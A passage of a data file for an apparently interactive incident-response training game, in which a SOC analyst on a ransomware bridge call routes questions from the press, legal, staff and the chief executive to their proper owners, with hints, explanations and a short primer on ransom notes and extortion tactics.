      {
        kind: "defuse",
        title: "Facts for Those Who Decide",
        prompt: "Monday 06:10, the first bridge call. Questions arrive from every side. For each voice, cut the answer a SOC analyst should actually give.",
        device: "The bridge call",
        seconds: 85,
        rounds: [
          {
            id: "press",
            state: "A trade journalist reaches the SOC line: is it ransomware, and was customer data taken?",
            wires: [
              { id: "a", label: "Confirm the basics, to stop the rumours early" },
              { id: "b", label: "Deny it until the investigation closes" },
              { id: "c", label: "Log the call and pass it to communications" },
            ],
            cut: "c",
            hint: "Who speaks for the company?",
            why: "A public statement carries legal and customer weight, and today's facts may change tomorrow. The call is a record worth keeping, and the answer belongs to communications.",
          },
          {
            id: "regulator",
            state: "Legal asks whether the pharma customers' records trigger a notification, and when the clock started.",
            wires: [
              { id: "a", label: "File the notification yourself, to beat the deadline" },
              { id: "b", label: "Give legal what left, whose it was, and when" },
              { id: "c", label: "Say it isn't reportable until the leak is confirmed" },
            ],
            cut: "b",
            hint: "Which part of that question can only you answer?",
            why: "Whether it's notifiable is a legal judgement. The dates and the data are yours, and they're what that judgement rests on.",
          },
          {
            id: "staff",
            state: "A shift manager wants an all-staff message out now: don't log in, passwords are compromised.",
            wires: [
              { id: "a", label: "Send it from your own mailbox straight away" },
              { id: "b", label: "Brief the incident lead on the facts" },
              { id: "c", label: "Post it in the all-staff chat" },
            ],
            cut: "b",
            hint: "Could the crew read that channel?",
            why: "Staff instructions go out once, from one owner, on a channel agreed for the incident. With every password stolen, the crew may be able to read mail and chat.",
          },
          {
            id: "pay",
            state: "The chief executive asks you directly: should we pay?",
            wires: [
              { id: "a", label: "Yes: the restore will take too long to survive" },
              { id: "b", label: "Give the facts: what got in, what went, what's still live" },
              { id: "c", label: "No: paying only funds the next attack on somebody else's network" },
            ],
            cut: "b",
            hint: "What does that decision need from you?",
            why: "Payment belongs to executives, legal counsel and often the insurer, with sanctions and regulators in view. Your job is the facts that decision needs, quickly and accurately.",
          },
        ],
        lesson: "Every question on that call has an owner: communications for the press, legal for the regulator, the incident lead for staff, the executives for payment. Each of them can only decide as well as the facts they're given.",
        primer: {
          title: "Who owns what on the day",
          points: [
            "**The SOC produces facts:** what got in, what was touched, what was taken, what's still spreading.",
            "**Executives, legal counsel and often the cyber insurer** decide on payment. Sanctions rules can apply, depending on who the crew turns out to be.",
            "**The note** points to a negotiation channel, often a Tor-hosted chat, and a leak site with a sample and a countdown.",
            "**Triple extortion** adds pressure: contacting customers or regulators, or threatening a denial-of-service attack.",
          ],
          example: {
            label: "Worked example: a flooded warehouse",
            lines: [
              "The duty engineer reports which rooms are wet, what stock is lost and whether water is still coming in.",
              "The directors and the insurer decide whether to claim, rebuild or move. Nobody asks the engineer to settle that.",
            ],
          },
          fold: true,
        },
      },
    ],
  },
};
